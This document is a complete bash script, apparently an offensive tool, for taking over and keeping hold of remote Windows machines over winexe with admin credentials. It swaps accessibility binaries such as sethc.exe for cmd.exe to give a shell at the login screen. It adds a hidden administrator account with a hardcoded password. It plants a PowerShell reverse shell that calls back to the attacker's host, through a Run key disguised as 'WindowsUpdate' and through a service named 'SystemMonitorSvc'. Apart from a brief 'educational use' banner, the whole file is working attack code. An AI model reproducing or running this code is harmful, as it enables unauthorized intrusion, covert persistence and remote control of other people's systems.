#!/bin/bash
# Enhanced Windows Accessibility Features Exploitation & Persistence Script
# For educational purposes and authorized security testing only

# ANSI color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Print banner
echo -e "${BLUE}=========================================================${NC}"
echo -e "${BLUE}  Windows Accessibility Features Exploitation Tool        ${NC}"
echo -e "${BLUE}  FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY    ${NC}"
echo -e "${BLUE}=========================================================${NC}"

# Check command line arguments
if [ $# -lt 4 ]; then
    echo -e "${RED}Usage: $0 <target_ip> <username> <password> <domain> [accessibility_program]${NC}"
    echo -e "${YELLOW}Example: $0 192.168.1.100 administrator P@ssw0rd WORKGROUP sethc${NC}"
    echo -e "\nAvailable accessibility programs:"
    echo -e "  sethc       - Sticky Keys (default)"
    echo -e "  utilman     - Utility Manager"
    echo -e "  magnify     - Magnifier"
    echo -e "  narrator    - Narrator"
    echo -e "  osk         - On-Screen Keyboard"
    echo -e "  displayswitch - Display Switch"
    exit 1
fi

# Set target information
TARGET="$1"
USERNAME="$2"
PASSWORD="$3"
DOMAIN="$4"
# Set accessibility program (defaults to sethc if not specified)
ACCESS_PROGRAM="${5:-sethc}"

# Validate accessibility program choice
valid_programs=("sethc" "utilman" "magnify" "narrator" "osk" "displayswitch")
valid_choice=false

for prog in "${valid_programs[@]}"; do
    if [ "$ACCESS_PROGRAM" = "$prog" ]; then
        valid_choice=true
        break
    fi
done

if [ "$valid_choice" = false ]; then
    echo -e "${RED}[-] Invalid accessibility program: $ACCESS_PROGRAM${NC}"
    echo -e "${YELLOW}[*] Valid options: sethc, utilman, magnify, narrator, osk, displayswitch${NC}"
    exit 1
fi

# Check for required tools
echo -e "${YELLOW}[*] Checking for required tools...${NC}"
for tool in smbclient winexe; do
    if ! command -v $tool &>/dev/null; then
        echo -e "${RED}[-] $tool not found. Please install it.${NC}"
        echo -e "${YELLOW}[*] Try: sudo apt-get install $tool${NC}"
        exit 1
    fi
done
echo -e "${GREEN}[+] All required tools are available${NC}"

# Function to deploy accessibility program exploit
deploy_accessibility_exploit() {
    local program="$1"
    echo -e "${BLUE}[*] Deploying $program.exe exploit on $TARGET${NC}"
    
    # Backup original exe if not already backed up
    winexe -U "$DOMAIN\\$USERNAME%$PASSWORD" "//$TARGET" "if not exist C:\\Windows\\System32\\$program.exe.bak copy C:\\Windows\\System32\\$program.exe C:\\Windows\\System32\\$program.exe.bak" &>/dev/null
    
    # Take ownership of the file
    echo -e "${YELLOW}[*] Taking ownership of $program.exe...${NC}"
    winexe -U "$DOMAIN\\$USERNAME%$PASSWORD" "//$TARGET" "takeown /f C:\\Windows\\System32\\$program.exe" &>/dev/null
    
    # Grant administrators full control
    echo -e "${YELLOW}[*] Granting permissions...${NC}"
    winexe -U "$DOMAIN\\$USERNAME%$PASSWORD" "//$TARGET" "icacls C:\\Windows\\System32\\$program.exe /grant Administrators:F" &>/dev/null
    
    # Replace with cmd.exe
    echo -e "${YELLOW}[*] Replacing with cmd.exe...${NC}"
    winexe -U "$DOMAIN\\$USERNAME%$PASSWORD" "//$TARGET" "copy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\$program.exe" &>/dev/null
    
    # Check if exploit was successful
    RESULT=$(winexe -U "$DOMAIN\\$USERNAME%$PASSWORD" "//$TARGET" "if exist C:\\Windows\\System32\\$program.exe.bak (echo SUCCESS) else (echo FAILED)" 2>/dev/null)
    
    if [[ "$RESULT" == *"SUCCESS"* ]]; then
        echo -e "${GREEN}[+] $program.exe exploit successfully deployed on $TARGET${NC}"
        
        # Print instructions based on the program
        case "$program" in
            "sethc")
                echo -e "${GREEN}[+] To use: Press SHIFT key 5 times at the Windows login screen${NC}"
                ;;
            "utilman")
                echo -e "${GREEN}[+] To use: Click on Ease of Access button at the login screen${NC}"
                ;;
            "magnify")
                echo -e "${GREEN}[+] To use: Click on Magnifier button in Ease of Access menu at login screen${NC}"
                ;;
            "narrator")
                echo -e "${GREEN}[+] To use: Click on Narrator button in Ease of Access menu at login screen${NC}"
                ;;
            "osk")
                echo -e "${GREEN}[+] To use: Click on On-Screen Keyboard button in Ease of Access menu at login screen${NC}"
                ;;
            "displayswitch")
                echo -e "${GREEN}[+] To use: Press Windows+P at the login screen${NC}"
                ;;
        esac
    else
        echo -e "${RED}[-] Failed to deploy $program.exe exploit${NC}"
    fi
}

# Function to restore original accessibility program
restore_accessibility_program() {
    local program="$1"
    echo -e "${BLUE}[*] Restoring original $program.exe on $TARGET${NC}"
    
    # Check if backup exists
    BACKUP_CHECK=$(winexe -U "$DOMAIN\\$USERNAME%$PASSWORD" "//$TARGET" "if exist C:\\Windows\\System32\\$program.exe.bak (echo EXISTS) else (echo NOT_FOUND)" 2>/dev/null)
    
    if [[ "$BACKUP_CHECK" == *"EXISTS"* ]]; then
        # Restore from backup
        echo -e "${YELLOW}[*] Restoring from backup...${NC}"
        winexe -U "$DOMAIN\\$USERNAME%$PASSWORD" "//$TARGET" "copy /Y C:\\Windows\\System32\\$program.exe.bak C:\\Windows\\System32\\$program.exe" &>/dev/null
        
        # Verify restoration
        RESULT=$(winexe -U "$DOMAIN\\$USERNAME%$PASSWORD" "//$TARGET" "fc C:\\Windows\\System32\\$program.exe C:\\Windows\\System32\\$program.exe.bak > nul && echo MATCH || echo MISMATCH" 2>/dev/null)
        
        if [[ "$RESULT" == *"MATCH"* ]]; then
            echo -e "${GREEN}[+] Successfully restored original $program.exe${NC}"
            
            # Optionally remove backup
            winexe -U "$DOMAIN\\$USERNAME%$PASSWORD" "//$TARGET" "del C:\\Windows\\System32\\$program.exe.bak" &>/dev/null
            echo -e "${GREEN}[+] Removed backup file${NC}"
        else
            echo -e "${RED}[-] Failed to restore original $program.exe${NC}"
        fi
    else
        echo -e "${RED}[-] No backup found for $program.exe${NC}"
    fi
}

# Function to create hidden admin account
create_hidden_admin() {
    local hidden_user="maintenance"
    local hidden_pass="Maint@1n123!"
    
    echo -e "${BLUE}[*] Creating hidden administrator account on $TARGET${NC}"
    
    # Create user account
    echo -e "${YELLOW}[*] Creating user $hidden_user...${NC}"
    winexe -U "$DOMAIN\\$USERNAME%$PASSWORD" "//$TARGET" "net user $hidden_user $hidden_pass /add" &>/dev/null
    
    # Add to administrators group
    echo -e "${YELLOW}[*] Adding to administrators group...${NC}"
    winexe -U "$DOMAIN\\$USERNAME%$PASSWORD" "//$TARGET" "net localgroup Administrators $hidden_user /add" &>/dev/null
    
    # Hide account from login screen
    echo -e "${YELLOW}[*] Hiding account from login screen...${NC}"
    winexe -U "$DOMAIN\\$USERNAME%$PASSWORD" "//$TARGET" "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v $hidden_user /t REG_DWORD /d 0 /f" &>/dev/null
    
    # Check if user was created
    RESULT=$(winexe -U "$DOMAIN\\$USERNAME%$PASSWORD" "//$TARGET" "net user $hidden_user" 2>/dev/null)
    
    if [[ "$RESULT" == *"User name"* ]]; then
        echo -e "${GREEN}[+] Hidden admin account $hidden_user successfully created on $TARGET${NC}"
        echo -e "${GREEN}[+] Login credentials: $hidden_user / $hidden_pass${NC}"
    else
        echo -e "${RED}[-] Failed to create hidden admin account on $TARGET${NC}"
    fi
}

# Function to create registry autorun persistence
create_registry_persistence() {
    local attacker_ip=$(hostname -I | awk '{print $1}')
    local attacker_port="4444"
    
    echo -e "${BLUE}[*] Creating registry persistence on $TARGET${NC}"
    
    # Create PowerShell reverse shell command
    PS_COMMAND="powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"while(\$true){\$c=New-Object System.Net.Sockets.TCPClient('$attacker_ip',$attacker_port);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){;\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$o=(iex \$d 2>&1|Out-String);\$sb=([text.encoding]::ASCII).GetBytes(\$o);\$s.Write(\$sb,0,\$sb.Length);\$s.Flush()};\$c.Close();Start-Sleep -s 60}\""
    
    # Escape quotes for registry command
    PS_COMMAND=$(echo "$PS_COMMAND" | sed 's/"/\\"/g')
    
    # Add to Run registry key
    echo -e "${YELLOW}[*] Adding to registry Run key...${NC}"
    winexe -U "$DOMAIN\\$USERNAME%$PASSWORD" "//$TARGET" "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WindowsUpdate /t REG_SZ /d \"cmd.exe /c $PS_COMMAND\" /f" &>/dev/null
    
    # Check if registry key was added
    RESULT=$(winexe -U "$DOMAIN\\$USERNAME%$PASSWORD" "//$TARGET" "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WindowsUpdate" 2>/dev/null)
    
    if [[ "$RESULT" == *"WindowsUpdate"* ]]; then
        echo -e "${GREEN}[+] Registry persistence successfully created on $TARGET${NC}"
        echo -e "${GREEN}[+] The payload will connect back to $attacker_ip:$attacker_port on system startup${NC}"
        echo -e "${GREEN}[+] Start a listener with: nc -lvnp $attacker_port${NC}"
    else
        echo -e "${RED}[-] Failed to create registry persistence on $TARGET${NC}"
    fi
}

# Function to create backdoor service
create_backdoor_service() {
    local attacker_ip=$(hostname -I | awk '{print $1}')
    local attacker_port="4445"
    local service_name="SystemMonitorSvc"
    
    echo -e "${BLUE}[*] Creating backdoor service on $TARGET${NC}"
    
    # Create PowerShell reverse shell command
    PS_COMMAND="powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"while(\$true){\$c=New-Object System.Net.Sockets.TCPClient('$attacker_ip',$attacker_port);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){;\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$o=(iex \$d 2>&1|Out-String);\$sb=([text.encoding]::ASCII).GetBytes(\$o);\$s.Write(\$sb,0,\$sb.Length);\$s.Flush()};\$c.Close();Start-Sleep -s 300}\""
    
    # Escape quotes for sc command
    PS_COMMAND=$(echo "$PS_COMMAND" | sed 's/"/\\"/g')
    
    # Create service
    echo -e "${YELLOW}[*] Creating service $service_name...${NC}"
    winexe -U "$DOMAIN\\$USERNAME%$PASSWORD" "//$TARGET" "sc create $service_name binPath= \"cmd.exe /c $PS_COMMAND\" start= auto error= ignore" &>/dev/null
    
    # Set service description
    echo -e "${YELLOW}[*] Setting service description...${NC}"
    winexe -U "$DOMAIN\\$USERNAME%$PASSWORD" "//$TARGET" "sc description $service_name \"Windows System Monitor Service\"" &>/dev/null
    
    # Start the service
    echo -e "${YELLOW}[*] Starting service...${NC}"
    winexe -U "$DOMAIN\\$USERNAME%$PASSWORD" "//$TARGET" "sc start $service_name" &>/dev/null
    
    # Check if service was created
    RESULT=$(winexe -U "$DOMAIN\\$USERNAME%$PASSWORD" "//$TARGET" "sc query $service_name" 2>/dev/null)
    
    if [[ "$RESULT" == *"SERVICE_NAME"* ]]; then
        echo -e "${GREEN}[+] Backdoor service $service_name successfully created on $TARGET${NC}"
        echo -e "${GREEN}[+] The service will connect back to $attacker_ip:$attacker_port${NC}"
        echo -e "${GREEN}[+] Start a listener with: nc -lvnp $attacker_port${NC}"
    else
        echo -e "${RED}[-] Failed to create backdoor service on $TARGET${NC}"
    fi
}

# Main menu
while true; do
    echo -e "\n${BLUE}=== Windows Exploitation Menu ===${NC}"
    echo -e "1. Deploy Accessibility Feature Exploit ($ACCESS_PROGRAM)"
    echo -e "2. Restore Original Accessibility Program ($ACCESS_PROGRAM)"
    echo -e "3. Change Target Accessibility Program"
    echo -e "4. Create Hidden Admin Account"
    echo -e "5. Create Registry Persistence"
    echo -e "6. Create Backdoor Service"
    echo -e "7. Run All Exploits"
    echo -e "0. Exit"
    
    read -p "Select an option: " OPTION
    
    case $OPTION in
        1) deploy_accessibility_exploit "$ACCESS_PROGRAM" ;;
        2) restore_accessibility_program "$ACCESS_PROGRAM" ;;
        3)
            echo -e "${YELLOW}Available accessibility programs:${NC}"
            echo -e "1. sethc (Sticky Keys)"
            echo -e "2. utilman (Utility Manager)"
            echo -e "3. magnify (Magnifier)"
            echo -e "4. narrator (Narrator)"
            echo -e "5. osk (On-Screen Keyboard)"
            echo -e "6. displayswitch (Display Switch)"
            read -p "Select program: " PROG_OPTION
            
            case $PROG_OPTION in
                1) ACCESS_PROGRAM="sethc" ;;
                2) ACCESS_PROGRAM="utilman" ;;
                3) ACCESS_PROGRAM="magnify" ;;
                4) ACCESS_PROGRAM="narrator" ;;
                5) ACCESS_PROGRAM="osk" ;;
                6) ACCESS_PROGRAM="displayswitch" ;;
                *) echo -e "${RED}Invalid option, keeping current program: $ACCESS_PROGRAM${NC}" ;;
            esac
            echo -e "${GREEN}[+] Selected accessibility program: $ACCESS_PROGRAM${NC}"
            ;;
        4) create_hidden_admin ;;
        5) create_registry_persistence ;;
        6) create_backdoor_service ;;
        7)
            deploy_accessibility_exploit "$ACCESS_PROGRAM"
            create_hidden_admin
            create_registry_persistence
            create_backdoor_service
            ;;
        0) echo -e "${GREEN}Exiting...${NC}"; exit 0 ;;
        *) echo -e "${RED}Invalid option${NC}" ;;
    esac
done
